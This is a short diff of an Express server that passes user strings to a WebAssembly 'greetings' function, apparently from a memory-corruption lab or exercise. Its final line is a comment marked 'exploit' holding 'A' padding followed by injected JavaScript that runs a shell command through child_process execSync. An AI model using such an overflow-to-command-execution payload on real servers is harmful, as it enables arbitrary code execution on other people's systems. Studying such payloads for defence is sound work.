@@ -3,9 +3,11 @@ const express = require('express')
 const app = express()
 const port = 3000
 
-function executeWasm(name) {
+var executeWasm;
+  console.log("DEBUG");
   var result = Module.onRuntimeInitialized = () => {
-  console.log("DEBUG", name);
+  console.log("LOADED");
+  executeWasm = function executeWasm(name) {
   const ptr = Module.allocate(
         Module.intArrayFromString(name),
         Module.ALLOC_NORMAL
@@ -14,10 +16,9 @@ function executeWasm(name) {
    Module._greetings(ptr);
 
    Module._free(ptr);
-   
-   console.log("DEBUG 2", ptr);
    }
-}
+   }
+   
 
 app.get('/', (req, res) => {
 // exploit AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAconst { execSync } = require('child_process');console.log(execSync('ls').toString());//
